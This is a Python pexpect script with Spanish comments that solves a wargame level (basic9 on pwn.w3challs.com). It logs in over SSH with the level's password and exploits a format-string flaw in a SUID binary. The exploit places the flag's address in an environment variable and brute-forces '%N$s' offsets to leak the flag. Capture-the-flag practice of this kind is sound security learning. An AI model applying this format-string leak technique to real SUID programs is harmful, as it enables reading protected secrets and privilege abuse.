#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])

print("[*] Verificando ejecución con SUID...")

# El binario es SUID, debería ejecutarse como basic9_pwned
child.sendline(b"id")
child.expect([b'\\$'])
print("Usuario actual:", child.before.decode())

# Ejecutar el binario y ver con qué permisos corre
child.sendline(b"/home/basic9/basic9 test 2>&1")
child.expect([b'\\$'])
output = child.before.decode('utf-8', errors='ignore')
print("\nOutput con argumento:")
print(output)

# Ver si imprime "Reading password" o "Fail"
if "Reading password" in output:
    print("\n[✓] El programa SÍ lee la flag")
    print("[*] La flag está en memoria, solo necesito encontrarla")
    
    # Si la lee, está en 0x0804a060
    # Necesito un exploit más sofisticado
    
    print("\n[*] IDEA FINAL: Usar el environment")
    print("[*] Las variables de entorno están en el stack!")
    
    # Crear una variable de entorno con la dirección
    child.sendline(b"export ADDR=$'\\x60\\xa0\\x04\\x08'")
    child.expect([b'\\$'])
    
    # Ahora la dirección está en el stack (en el environment)
    # Buscarla
    child.sendline(b"cd /tmp")
    child.expect([b'\\$'])
    
    for i in range(1, 200):
        if i % 20 == 0:
            print(f"  Probando posición {i}...")
        
        cmd = f"ADDR=$'\\x60\\xa0\\x04\\x08' /home/basic9/basic9 '%{i}$s' 2>&1 | strings | grep -q W3C && echo 'FOUND AT {i}'".encode()
        child.sendline(cmd)
        child.expect([b'\\$'], timeout=1)
        
        output = child.before
        if b'FOUND AT' in output:
            print(f"\n🔥 ENCONTRADO EN POSICIÓN {i} 🔥")
            
            # Obtener la flag
            cmd2 = f"ADDR=$'\\x60\\xa0\\x04\\x08' /home/basic9/basic9 '%{i}$s' 2>&1 | strings | grep W3C".encode()
            child.sendline(cmd2)
            child.expect([b'\\$'], timeout=2)
            
            flag_output = child.before.decode('utf-8', errors='ignore')
            print(f"FLAG: {flag_output}")
            break
            
elif "Fail" in output:
    print("\n[!] El programa NO puede leer la flag")
    print("[*] Puede haber otro problema...")

child.close()